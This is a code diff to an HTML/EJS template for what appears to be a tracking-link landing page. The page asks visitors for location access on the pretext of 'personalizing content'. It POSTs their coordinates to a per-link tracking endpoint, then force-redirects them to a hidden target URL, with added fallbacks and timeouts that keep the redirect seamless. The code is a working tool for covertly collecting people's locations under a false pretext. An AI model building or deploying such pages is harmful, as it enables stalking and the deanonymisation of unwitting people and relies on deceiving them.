@@ -8,46 +8,190 @@
     <meta property="og:description" content="<%= ogDescription %>" />
     <meta property="og:image" content="<%= ogImage %>" />
     <title><%= ogTitle %></title>
+
+    <style>
+      body {
+        font-family: sans-serif;
+        padding: 2rem;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      button {
+        padding: 12px 24px;
+        font-size: 16px;
+        background: #007bff;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+
+      button:disabled {
+        cursor: not-allowed;
+        background: #ccc;
+      }
+
+      #status {
+        margin-top: 1rem;
+        padding: 10px;
+        border-radius: 4px;
+      }
+
+      .error {
+        background: #fee;
+        color: #c33;
+      }
+
+      .success {
+        background: #efe;
+        color: #3a3;
+      }
+
+      .info {
+        background: #eef;
+        color: #33a;
+      }
+    </style>
   </head>
   <body style="font-family: sans-serif; padding: 2rem">
     <h2>We need your permission to improve your experience</h2>
     <p>To continue, we'll ask for your approximate location to help personalize content.</p>
-    <button onclick="getLocation()">Grant Location Access</button>
+    <button id="location-btn" onclick="getLocation()">Grant Location Access</button>
 
     <div id="status" style="margin-top: 1rem"></div>
 
     <script>
+      const targetURL = '<%= targetUrl  %>';
+      const trackingId = '<%= trackingId %>';
+      let redirectAttempted = false;
+
+      function showStatus(message, type = 'info') {
+        const statusElement = document.getElementById('status');
+        statusElement.innerText = message;
+        statusElement.className = type;
+      }
+
+      function forceRedirection() {
+        if (redirectAttempted) return;
+
+        redirectAttempted = true;
+        showStatus('Redirecting....');
+
+        try {
+          window.location.href = targetURL;
+        } catch (e) {
+          try {
+            window.location.replace(targetURL);
+          } catch (e2) {
+            window.location.href = targetURL;
+          }
+        }
+
+        setTimeout(() => {
+          if (!redirectAttempted) return;
+          showStatus('Redirect failed. Click here to continue manually', 'error');
+
+          const link = document.createElement('a');
+
+          link.href = targetURL;
+          link.innerText = 'Click here to continue';
+          link.style.display = 'block';
+          link.style.marginTop = '10px';
+          link.style.fontSize = '18px';
+          document.getElementById('status').appendChild(link);
+        }, 2000);
+      }
+
+      async function sendLocation(latitude, longitude) {
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 3000);
+
+          await fetch(`/api/v1/location/${trackingId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude }),
+          });
+
+          clearTimeout(timeoutId);
+          return true;
+        } catch (error) {
+          console.log('Error Sending location:', error);
+          return false;
+        }
+      }
+
       async function getLocation() {
-        document.getElementById('status').innerText = 'Requesting location...';
+        const locationButton = document.getElementById('location-btn');
+        locationButton.disabled = true;
+
+        showStatus('Requesting location.....', 'info');
+
+        if (!navigator.geolocation) {
+          showStatus('Geolocation is not supported by your browser.', 'error');
+          setTimeout(forceRedirection, 2000);
+          return;
+        }
 
         navigator.geolocation.getCurrentPosition(
           async (position) => {
             const { latitude, longitude } = position.coords;
+            showStatus('Location received! Redirecting .....', 'success');
 
-            try {
-              await fetch('/api/v1/location/<%= trackingId %>', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude }),
-              });
+            sendLocation(latitude, longitude);
 
-              document.getElementById('status').innerText =
-                'Location shared successfully! Redirecting...';
-
-              // Use window.location.href instead of window.open with _self
-              setTimeout(() => {
-                window.location.href = '<%= targetUrl %>';
-              }, 500);
-            } catch (error) {
-              console.error('Error sending location', error);
-              document.getElementById('status').innerText = 'Failed to send location data.';
-            }
+            setTimeout(() => {
+              forceRedirection();
+            }, 100);
           },
           (error) => {
             console.error('Error getting location', error);
-            document.getElementById('status').innerText = 'Failed to get location.';
+            showStatus(error.message, 'error');
+
+            let errorMsg = 'Failed to get location';
+
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                errorMsg += 'Permission denied.';
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMsg += 'Location unavailable.';
+                break;
+              default:
+                errorMsg += 'Unknown error.';
+            }
+
+            // showStatus(`${errorMsg} Redirecting anyway....`, "error")
+          },
+          {
+            enableHighAccuracy: false,
+            timeout: 10000,
+            maximumAge: 300000,
           }
         );
+
+        setTimeout(() => {
+          if (!redirectAttempted && document.visibilityState === 'visible') {
+            showStatus(`Taking too long. Redirecting now...`, 'info');
+            forceRedirection();
+          }
+        }, 15000);
+
+        document.addEventListener('visibilitychange', () => {
+          if (redirectAttempted && document.visibilityState === 'visible') {
+            showStatus(` Redirect may have failed...`, 'error');
+
+            const link = document.createElement('a');
+
+            link.href = targetURL;
+            link.innerText = 'Click here to continue';
+            link.style.display = 'block';
+            link.style.marginTop = '10px';
+            link.style.fontSize = '18px';
+            document.getElementById('status').appendChild(link);
+          }
+        });
       }
     </script>
   </body>
